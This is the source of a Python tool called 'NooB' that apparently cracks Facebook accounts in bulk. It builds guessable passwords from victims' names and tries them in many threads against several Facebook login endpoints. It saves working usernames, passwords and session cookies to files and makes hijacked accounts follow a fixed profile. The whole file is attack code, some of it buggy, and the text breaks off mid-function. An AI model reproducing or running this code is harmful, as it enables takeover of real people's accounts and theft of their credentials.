#!/usr/bin/python
import os
import sys
try:
    import requests
except ModuleNotFoundError:
    print("[*] Installing Module requests")
    os.system("python -m pip install requests &> /dev/null")
try:
    import bs4
except ModuleNotFoundError:
    print("[*] Installing Module bs4")
    os.system("python -m pip install bs4 &> /dev/null")
try:
    import mechanize
except ModuleNotFoundError:
    print("[*] Install Module mechanize")
    os.system("python -m pip install mechanize &> /dev/null")
try:
    import gTTS
except ModuleNotFoundError:
    os.system("python -m pip install gTTS &> /dev/null")
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import requests as req
import requests as re
import time
import random
import json
import sys
import time
import datetime
import hashlib
import platform
import re
import threading
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
import bs4
import sys
import os
import subprocess
import random
import base64
import platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as mk
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as mk
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
urls="https://business.facebook.com/business_locations"
_ses=requests.Session()
	
        
def real_time():
	from time import time
	return str(time()).split('.')[0]
id1 = uuid.uuid4().hex[:7].upper()
id2 = uuid.uuid4().hex[:7].upper()
id3 = uuid.uuid4().hex[:7].upper()
key = id1 + '-' +id2 + '-' + id3
key1 = id1 + '-' +id2 + '-' + id3
def logo():
	os.system("clear")
	time.sleep(0.5)
	print("\x1b[0;97m            d8b   db  .d88b.   .d88b.  d8888b. \n            888o  88 .8P  Y8. .8P  Y8. 88  `8D \n            88V8o 88 88    88 88    88 88oooY' \n            88 V8o88 88    88 88    88 88    b. \n            88  V888 `8b  d8' `8b  d8' 88   8D \n            VP   V8P  `Y88P'   `Y88P'  Y8888P'")
	print("-----------------------------------------------------------")
	print("[*] Tool Name : NooB        ");("[*] Version : 0.0.1     ")
	print("[*] Edit By   : Mujtaba Khan                ");("[*] Date : " + alldatexx)
	print("[*] Your Key  : " + key)
	print("-----------------------------------------------------------")
ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

def hasil(OK,cp):
	exit()


try:
	user_ip = requests.get("http://ip-api.com/json/").json()["query"]
except:
	user_ip = ' - '
try:
	user_country = requests.get("http://ip-api.com/json/").json()["country"].lower()
except:
	user_country = ' - '
try:
	user_regionName = requests.get("http://ip-api.com/json/").json()["regionName"].lower()
except:
	user_regionName = ' - '
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
year = current.year
bu = current.month
cday = current.day
months = monthsx[nTemp]
my_date = date.today()
day = calendar.day_name[my_date.weekday()]
alldate = ("%s-%s-%s-%s"%(day, cday, months, year))
alldatex = ("%s %s %s"%(cday, months, year))
alldatexx = ("%s/%s/%s"%(cday, months, year))
file_cp = 'Cloning/Facebook/Result/CP'+alldate+'.txt'
file_ok = 'Cloning/Facebook/Result/OK'+alldate+'.txt'
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
def jalanx(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.09)
try:
	key = open('/data/data/com.termux/files/usr/bin/.noob.txt', 'r').read()
except:
	kok = open('/data/data/com.termux/files/usr/bin/.noob.txt', 'w')
	kok.write(key1)
	kok.close()
key = open('/data/data/com.termux/files/usr/bin/.noob.txt', 'r').read()

ok = []
cp = []
id = []
user = []
num = 0
loop = 0
Bilal_Haider_ID = print
Bilal_Haider = open
Prof_Bilal = requests.get
_silet_koceng_  = requests.Session()
url_mb = "https://mbasic.facebook.com"
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_realme = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'	# WARNA MATI 

sys.stdout.write('\x1b[1;33m\x1b]2; [ Noob MK.../ ] \x07')

def ugen_hp():
	logo()
	print("[01] Save User-Agent Xiaomi ")
	print("[02] Save User-Agent Nokia ")
	print("[03] Save User-Agent Asus ")
	print("[04] Save User-Agent Huawei ")
	print("[05] Save User-Agent Vivo ")
	print("[06] Save User-Agent Oppo ")
	print("[07] Save User-Agent Window ")
	print("[08] Save User-Agent Samsung ")
	print("[09] Save User-Agent Customize ")
	pc = input("\n[>>] Choose : ")
	os.system("rm -rf Cloning/Facebook/Data/usergent.txt")
	if pc in['']:
		ugent_hp()
	elif pc in ['1','01']:
		ugent = open('usergent.txt','w');ugent.write(ua_xaomi);ugent.close()
	elif pc in ['2','02']:
		ugent = open('usergent.txt','w');ugent.write(ua_nokia);ugent.close()
	elif pc in ['3','03']:
		ugent = open('usergent.txt','w');ugent.write(ua_asus);ugent.close()
	elif pc in ['4','04']:
		ugent = open('usergent.txt','w');ugent.write(ua_huawei);ugent.close()
	elif pc in ['5','05']:
		ugent = open('usergent.txt','w');ugent.write(ua_vivo);ugent.close()
	elif pc in ['6','06']:
		ugent = open('usergent.txt','w');ugent.write(ua_oppo);ugent.close()
	elif pc in ['7','07']:
		ugent = open('usergent.txt','w');ugent.write(ua_samsung);ugent.close()
	elif pc in ['8','08']:
		ugent = open('usergent.txt','w');ugent.write(ua_windows);ugent.close()
	elif pc in ['9','09']:
		ua_costomize = input("[*] Enter Your User - Agent : ")
		agent = open('usergent.txt','w');ugent.write(ua_costomize);ugent.close()
	jalan("[*] Successfully Changed User Agent ")
	input("[*] Back ");time.sleep(2);fb_menu()
def key_send():
	logo()
	os.system('xdg-open https://wa.me/+923424684410?text=' + key )
	time.sleep(2)
	fb_menu()
def team_info():
	logo()
	print("                        T E A M  A L T    ")
	print("-----------------------------------------------------------")
	print(' [->] Team : CodeX-ID ')
	print(' [->] Team GitHub : https://github.com/CodeX-ID')
	print("-----------------------------------------------------------")
	print("                T E A M  -  M E M B E R S          ")
	print("-----------------------------------------------------------")
	print(" [->] Kang ProfAcc   [->] Yayan XD   [->] Mujtaba Khan ")
	print(" [->] Saqib Mahmood  [->] Abdullah   [->] Rahul Mishra ")
	print(" [->] Black Tiger    [->] James      [->] Rishu ")
	print(" [->] Shan Fanfa     [->] Farhan     [->] Mr Adi  ")
	print(" [->] Kabir Singh    [->]            [->]          ")
	print("-----------------------------------------------------------")
	input(" [->] BACK :/ ")
	time.sleep(1.5)
	fb_menu()

def fb_menu():
	logo()
	print("[>>] User IP : " + user_ip )
	print("[>>] User Country : " + user_country )
	print("[>>] User Region : " + user_regionName )
	print("[>>] Status :\033[1;92m  Premium  ")
	print("-----------------------------------------------------------")
	print("\x1b[1;92m[01] File Cloning [ Old Method ] ")
	print("[02] File Cloning [ New Method ] [ Two ]")
	print("\x1b[1;97m[03] Change Setting User-Agent")
	print("[04] Script Team Info")
	fb_choose = input("\n[>>] Choose : ")
	if fb_choose in [""," "]:
		time.sleep(1.5)
		fb_menu()
	
	elif fb_choose in ["1","02"]:
		__crack__().plerr()
	elif fb_choose in ["2","02"]:
		print("")
		logo()
		print("[01] New Method Crack V1 ")
		print("[02] New Method Crack V2 ")
		cho_n_m = input("[->] Choose : ")
		if cho_n_m in ['01','1']:
			__ALT__().mk(id)
		elif cho_n_m in ['02','2']:
			__mk1__().mkk(id)
	elif fb_choose in ["3","03"]:
		ugen_hp()
	elif fb_choose in ["4","04"]:
		team_info()
	
class __ALT__:
    def __init__(self):
        self.id = []
        logo()
    def mk(self,ak):
        
        
        self.cnt = input(' [*] F i L E  N A M E : ')
        self.id = Bilal_Haider(self.cnt).read().splitlines()
        print('[•] T O T A L  i Ds : %s'%(len(self.id)))
        
    
        
        
        logo()
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop,infoong
        sys.stdout.write(f"\r \x1b[1;37m[ N O O B ]\x1b[1;37m {loop}|{len(self.id)} \x1b[1;32m[Ok][{len(ok)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://mbasic.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [Noob-Ok] {user} | {pw}")
                    cek_apk(coki)
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    
                    
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [Noob-CP] %s | %s ' % (M, uer, p))
                        cek_apk(coki)
                        wrt = '%s|%s' % (use,w)
                        cp.append(wrt)
                        open('CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [Noob-CP] %s | %s ' % (M, user, pw))
                    cek_apk(coki)
                    wrt = '%s|%s' % (usr,w)
                    cp.append(wrt)
                    open('CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100001392811242', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
    	
    	
        print(' [1] Method 1 [ Pro ] ')
        chi = input('\n [?] Choose: ')
        if chi == '':
            print('\n   Select Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            logo()
        
	
            with mk(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"12", xz[0]+"1122", xz[0]+"786"]
                        else:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"12", xz[0]+"1122", xz[0]+"786"]
                            
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            os.remove(self.apk)
        elif chi in ('2', '02'):
            os.system("clear")
            

            logo()
            with mk(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1] ]
                        else:
                            pwx = [name, xz[0]+xz[1] ]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()




class __crack__:
    def __init__(self):
        self.id = []
        logo()
    def plerr(self):
        try:
            self.apk = input('\n[•]  F i L E   N A M E : ')
            self.id = Bilal_Haider(self.apk).read().splitlines()
            Bilal_Haider_ID('[•] T O T A L  i Ds : %s'%(len(self.id)))
            print('[*] For Default Password Type D & M For Menual  ')
            print('[M] Menual Password ')
            print('[D] Default Password ')
        except:
            Bilal_Haider_ID('\n[!] Dump File Not Found')
            input('\n[•] Press Enter To Back');fb_menu()
            
        _jokowi_kontol_ = input("Choose : ")
        if _jokowi_kontol_ in ('M', 'm'):
            
            
            Bilal_Haider_ID('\nEnter Password 123456 or 123456789 For OLd Idz ')
            while True:
                pwek = input('\nEnter Password : ')
                #Bilal_Haider_ID('Sandi > %s'%(pwek))
                if pwek == '':
                    Bilal_Haider_ID('\nDo Not Empty')
                    time.sleep(1)
                    fb()
                elif len(pwek)<=5:
                    Bilal_Haider_ID('\nPassward Must Be Six Digit ')
                else:
                    def _sempak_(bse=None):
                        boy = input('\nSelect : ')
                        if boy == '':
                            Bilal_Haider_ID('\nDo Not Empty')
                            time.sleep(1);self._sempak_()
                        elif boy == "1" or boy == "01":
                            
                            logo()
                            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        _ngentot_gratis_.submit(self.__api__, kimochi, bse)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif boy == "2" or boy == "02":
                            
                            logo()
                            with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        _ngentot_gratis_.submit(self.__mbasic__, kimochi, bse)
                                    except: pass
                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif boy == "3" or boy == "03":
                            
                            logo()
                            with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        _ngentot_gratis_.submit(self.__mfb,__, kimochi, bse)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            #Bilal_Haider_ID('\nSalah')
                            exit()

                    Bilal_Haider_ID('\n\t------[ Method Crack ]-----')
                    Bilal_Haider_ID('\n01.) Method b-API ')
                    Bilal_Haider_ID('02.) Method Mbasic [Pro Recommend By MK] ')
                    Bilal_Haider_ID('03.) Method Mobile ')
                    _sempak_(pwek.split(','))
                    break
        elif _jokowi_kontol_ in ('D', 'd'):
            Bilal_Haider_ID('\n\t------[ Method Crack ]-----')
            Bilal_Haider_ID('[01] Method b-Api [Fast]')
            Bilal_Haider_ID('[02] Method Mbasic [ Pro ]')
            Bilal_Haider_ID('[03] Method Mobile  ')
            Bilal_Haider_ID('[04] Method Mbasic [One Password Faster]  ')
            self.__pler__()
        else:
            Bilal_Haider_ID('\nType 1 2, or 3')
            fb()
        return
 
    def __api__(self, user, _sempak_):
        global ok,cp,loop,infoong
        sys.stdout.write(f"\r \x1b[1;37m[ N O O B ]\x1b[1;37m {loop}|{len(self.id)} \x1b[1;3m[Ok][{len(ok)}] ")
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
            	ua_xiaomi = Bilal_Haider('agent.txt', 'r').read()
            except (KeyError, IOError):
            	ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            p = Prof_Bilal("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                Bilal_Haider_ID('\r\033[1;9m[Noob-OK] %s • %s%s      '%(user,pw,))
                cek_apk(coki)
                wrt = '%s - %s %s'%(user,pw,)
                ok.append(wrt)
                open('OK.txt' ,'a').write('%s\n' % wrt)
                break
                continue
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    token = Bilal_Haider('login.txt').read()
                    cp_ttl = Prof_Bilal('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    #Bilal_Haider_ID('\r\033[1;91m[Noob-CP] %s • %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    cek_apk(coki)
                    wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahun(user))
                    cp.append(wrt)
                    open('CP.txt' ,'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                #Bilal_Haider_ID('\r\033[1;91m[Noob-CP] %s • %s%s      '%(user,pw,tahun(user)))
                cek_apk(coki)
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
                open('CP.txt' ,'a').write('%s\n' % wrt)
                break
                continue
        loop += 1
        #    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100001392811242",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text
    def __mbasic__(self, user, _sempak_):
        global ok,cp,loop,infoong
        sys.stdout.write(f"\r \x1b[1;37m[ N O O B ]\x1b[1;37m {loop}|{len(self.id)} \x1b[1;32m[Ok][{len(ok)}] ")
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
            	ua_xiaomi = Bilal_Haider('agent.txt', 'r').read()
            except (KeyError, IOError):
            	ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                Bilal_Haider_ID('\r\033[1;92m[Noob-OK] %s • %s      ' % (user,pw))
                cek_apk(coki)
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt' ,'a').write('%s\n' % wrt)
                
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict():
                try:
                    token = Bilal_Haider('token.txt').read()
                    cp_ttl = Prof_Bilal('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    #Bilal_Haider_ID('\r\033[1;91m[Noob-CP] %s • %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
                    cek_apk(coki)
                    wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
                    cp.append(wrt)
                    open('CP.txt' ,'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                #Bilal_Haider_ID('\r\033[1;91m[ALT-CP] %s • %s%s      ' % (user,pw,tahun(user)))
                cek_apk(coki)
                wrt = '%s - %s%s'%(user,pw,tahun(user))
                cp.append(wrt)
                open('CP.txt' ,'a').write('%s\n' % wrt)
                break
                continue
        loop += 1
#    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100001392811242",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text
    def __mfb__(self, user, _sempak_):
        global ok,cp,loop,infoong
        sys.stdout.write(f"\r \x1b[1;37m[ N O O B ]\x1b[1;37m {loop}|{len(self.id)} \x1b[1;32m[Ok][{len(ok)}] ")
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
            	ua_xiaomi = Bilal_Haider('agent.txt', 'r').read()
            except (KeyError, IOError):
            	ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({
            "Host":"m.facebook.com",
